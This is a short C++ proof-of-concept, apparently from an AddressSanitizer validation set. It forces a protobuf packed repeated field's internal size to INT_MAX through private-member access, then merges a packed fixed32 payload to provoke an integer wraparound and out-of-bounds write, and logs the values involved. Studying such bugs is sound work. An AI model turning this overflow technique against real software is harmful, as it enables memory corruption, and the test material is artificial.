#include <climits>
#include <cstdint>
#include <iomanip>
#include <iostream>
#include <string>

#define private public
#include "../poc/packed_fixed32.pb.h"
#undef private

int main() {
  using asanvalidator::protobufinput003::PackedFixed32Message;

  PackedFixed32Message message;
  auto* nums = message.mutable_nums();
  nums->Reserve(3);

  message._impl_.nums_.soo_rep_.set_size(INT_MAX);

  const char wire[] = {
      0x0a,
      0x04,
      0x41,
      0x42,
      0x43,
      0x44,
  };
  const std::string payload(wire, sizeof(wire));

  const int old_entries = message.nums_size();
  const int packed_num = 1;
  const int64_t requested_size_64 =
      static_cast<int64_t>(old_entries) + packed_num;
  const uint32_t wrapped_bits =
      static_cast<uint32_t>(old_entries) + static_cast<uint32_t>(packed_num);
  const int32_t wrapped_size = static_cast<int32_t>(wrapped_bits);

  std::cerr << "api=google::protobuf::MessageLite::MergeFromString\n";
  std::cerr << "raw_size_field=" << message._impl_.nums_.soo_rep_.size() << "\n";
  std::cerr << "initial_size=" << old_entries << "\n";
  std::cerr << "initial_capacity=" << nums->Capacity() << "\n";
  std::cerr << "nums_data_ptr=" << static_cast<const void*>(nums->mutable_data())
            << "\n";
  std::cerr << "payload_bytes=" << payload.size() << "\n";
  std::cerr << "packed_length_field=4\n";
  std::cerr << "element_width=4\n";
  std::cerr << "new_entries=" << packed_num << "\n";
  std::cerr << "requested_size_64=" << requested_size_64 << "\n";
  std::cerr << "wrapped_size_signed=" << wrapped_size << "\n";
  std::cerr << "wrapped_size_hex=0x" << std::hex << std::uppercase
            << wrapped_bits << std::dec << "\n";
  const bool ok = message.MergeFromString(payload);
  std::cerr << "merge_ok=" << ok << "\n";
  std::cerr << "final_size=" << message.nums_size() << "\n";
  return ok ? 0 : 1;
}
